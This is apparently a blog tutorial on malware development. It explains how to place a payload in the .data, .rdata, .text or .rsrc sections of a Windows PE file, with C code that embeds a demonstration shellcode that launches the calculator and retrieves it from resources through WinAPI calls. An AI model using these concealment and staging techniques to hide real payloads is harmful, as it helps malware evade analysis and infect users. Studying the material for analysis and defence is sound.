---
categories:
- Cybersecurity
- Malware Development
date: 2024-04-15 13:00:00 +0530
description: This technical guide explores various sections within PE files where malware payloads can be stored, including .data, .rdata, .text, and .rsrc, detailing their characteristics, implications, and methods for accessing and updating payloads
img_path: /assets/
published: true
tags:
- malware development
- payload
- WinAPI 
title: 'Payload Placement (.data, rdata, .text, .rsrc)'
---

## Introduction

As a malware developer, one will have several options as to where the payload can be stored within the PE file. Depending on the choice, the payload will reside in a different section within the PE file. Payloads can be stored in one of the following PE sections:

- .data
- .rdata
- .text
- .rsrc

## .data Section

---

The .data section of a PE file is a section of a program’s executable file that contains initialized global and static variables. The section is readable and writable, making it suitable for an encrypted payload that requires decryption during runtime. If the payload is a global or local variable, it will be stored in the .data section, depending on the compiler settings.

```c
#include <Windows.h>
#include <stdio.h>

unsigned char payload[] = {
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};

int main()
{

	printf("[i] Payload Raw data: 0x%p \n", payload);
	printf("[*] Press <Enter> To Quit..");
	getchar();

	return 0;
}
```

The image below show the output of the above snippet in xdbg.

1. The .data section starts at the address 0x00007FF7BDF5C000
2. The payload’s base address is 0x00007FF7BDF5C000
3. Memory protection region is specified as RW which indicates it is a read-write region.

![Untitled](../assets/images/Payload%20Placement/Untitled.png)

![Untitled](../assets/images/Payload%20Placement/Untitled%201.png)

## .rdata Section

---

Variables that are specified using the **const** qualifier are written as constants. These types of variables are considered “read-only” data. 

The letter “r” in .**rdata** indicates this, and any attempt to change these variables will cause access violations. Furthermore, depending on the compiler and its settings, the **.data** and **.rdata** sections may be merged, or even merged into the **.text** section.

The code snippet below show an example of having a payload stored in **.rdata** section. The code will essentially be the same as the previous code snippet except the variable is now proceded by the const quilifier.

```c
#include <Windows.h>
#include <stdio.h>

**const** unsigned char payload[] = {
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};

int main()
{

	printf("[i] Payload Raw data: 0x%p \n", payload);
	printf("[*] Press <Enter> To Quit..");
	getchar();

	return 0;
}
```

The image below shows the output of running dumpbin.exe on the PE file.

![Untitled](../assets/images/Payload%20Placement/Untitled%202.png)

![Untitled](../assets/images/Payload%20Placement/Untitled%203.png)

## .text Section

---

### Introduction

The previous module discussed storing payload in the .data nad .rdata section, while this module covers storing payloads in the .text section.

Saving the variables in the .text section differs from saving them in the .data or .rdata sections, as it is not just a matter of declaring a random variable. Rather, one must instruct the compiler to save it in the .text section, which is demonstrated in the code below.

```c
#include <Windows.h>
#include <stdio.h>

#pragma section(".text")
__declspec(allocate(".text")) **const** unsigned char payload[] = {
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};

int main()
{

	printf("[i] Payload Raw data: 0x%p \n", payload);
	printf("[*] Press <Enter> To Quit..");
	getchar();

	return 0;
}
```

Here the compiler is told to place the payload variable in the .text section instead of the .rdata section. The .text section is special in that is stores variables with executable memory permissions, allowing them to be executed directly without the need for editing the memory region permissions. This is useful for small payloads that are roughly less that 10 bytes.

Inspecting the binary compiled from the above using PE-Bear tool reveals that the payload is located in the .text section:

![Untitled](../assets/images/Payload%20Placement/Untitled%204.png)

## .rsrc Section

---

### Introduction

Saving the payload in the .rsrc section is one of the best options as this is where most real-world binaries save their data. It is also a cleaner method for malware authors, since larger payloads cannot be stored in the .data or .rdata sections due to size limits, leading to errors from Visual Studio during the compalation.

The steps below illustrate how to store a payload in the .rsrc section.

1. Inside Visual Studio, right-click on “Resource files” then click Add > New Item.

![Untitled](../assets/images/Payload%20Placement/Untitled%205.png)

1. Click on “Resource File”.

![Untitled](../assets/images/Payload%20Placement/Untitled%206.png)

1. This will generate a new sidebar, the Resource View. Right-click on the .rc file (Resource.rc is the default name), and select the “Add Resource” option.

![Untitled](../assets/images/Payload%20Placement/Untitled%207.png)

1. Import

![Untitled](../assets/images/Payload%20Placement/Untitled%208.png)

1. Select the calc.ico, which is the raw payload renamed to have the .ico extension

![Untitled](../assets/images/Payload%20Placement/Untitled%209.png)

1. A prompt will appear requesting the resource type. Enter “RCDATA” without the qutes.

![Untitled](../assets/images/Payload%20Placement/Untitled%2010.png)

1. After selecting OK, the payload should be displayed in raw binary format within the Visual Studio project\

![Untitled](../assets/images/Payload%20Placement/Untitled%2011.png)

1. When exiting the Resource View, the “resource.h” header file should be visible and named according to the .rc file from step 2. This file contains a define statement that refers to the payload’s ID in the resource section (IDR_RCDATA1). This is important in order to be able to retrieve the payload from the resource section header.

![Untitled](../assets/images/Payload%20Placement/Untitled%2012.png)

Once compiled, the payload will now be stored in the .rsrc section, but it cannot be accessed directly. Instead, several WinAPIs must be used to access it.

- FindResourceW - Get the location of the specified data stored in the resource section of special ID passed in (this is defined in the header file)
- LoadResource - Retrives a HGLOBAL handle to resource data. This handle can be used to obtain the base address of the specified resource in memory.
- LockResource - Obtain a pointer to the specified data in the resource section from its handle
- SizeofResource - Get the size of the specified data in the resource section.

The code snippet below will utilize the above Windows APIs to acces the .rsrc section and fetch the payload address and size.

```c
#include <Windows.h>
#include <stdio.h>
#include "resource1.h"

int main()
{

	HRSRC hRsrc = NULL;
	HGLOBAL hGlobal = NULL;
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = NULL;

	// Get the handle to the data stored in .rsrc by its id "IDR_RCDATA1"
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL)
	{
		printf("[!] FindResourceW Failed With Error! %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		printf("[!] LoadResource Failed With Error! %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL)
	{
		printf("[!] LockResource Failed With Error! %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL)
	{
		printf("[!] SizeofResource Failed With Error! %d \n", GetLastError());
		return -1;
	}

	// Printing pointer and size to the screen
	printf("[i] pPayloadAddress var: 0x%p \n", pPayloadAddress);
	printf("[i] sPayloadSize var: %ld \n", sPayloadSize);
	printf("[#] Press <Enter> To Quit...");
	getchar();
	
	return 0;
}
```

After compiling and running the code above, the payload address along with its size will be printed ont the screee. It is important to note that this address is in the .rsrc section, which is read-only memory, and any attempts to change or edit data within will cause an access violation error. To edit payload, a buffer must be allocated with the same size as the payloada and copied over. This new buffer is where changes, such as decrypting the payload, can be made.

### Updating .rsrc Payload

Since the payload can’t be edited directly from within the resource section, it must be moved to temporary buffer. To do so, memory is allocated the size of the payload using HeapAlloc and then the payload is moved from the resouce section to the temporary buffer using memcpy.

```c

	// Allocating memory using a HeapAlloc call
	PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
	if (pTmpBuffer != NULL)
	{
		// copying the payload from resouce section to the new buffer
		memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
	}

	// printing the base address of our buffer (ptmpbuffer)
	printf("[i] pTmpBuffer var: 0x%p \n", pTmpBuffer);
```

Since pTmpBuffer now points to a writable memory region that is holding the payload, it’s possible to decrypt the payload or perform any updates to it.

![Untitled](../assets/images/Payload%20Placement/Untitled%2013.png)

![Untitled](../assets/images/Payload%20Placement/Untitled%2014.png)

## Conclusion

Developing malware entails careful consideration of where the payload will be located within the executable file (PE file). Options include the .data, .rdata, .text, and .rsrc sections, each with its own characteristics and applications.

- The **.data** section is suitable for payloads requiring decryption during execution, as this section is both readable and writable.
- The **.rdata** section is used for constants and read-only data, useful for preventing unauthorized data alteration.
- The **.text** section allows storage of payloads with executable memory permissions, making it suitable for small payloads.
- The **.rsrc** section is ideal for payload storage as it is commonly used in real-world applications and can contain larger data.

Implementing these payloads requires different approaches, such as manipulating WinAPIs to access the .rsrc section or using specific compiler directives for storage in the .text section.

Once the payload is placed, it's crucial to know how to access and update it, especially in the case of the .rsrc section where direct editing isn't possible. This necessitates copying the payload into temporary memory space to enable changes. After updating, the payload can be utilized in various malicious scenarios.

Ultimately, the choice of section for storing the payload depends on the specific needs of the malware and the requirements of its functionality and concealment.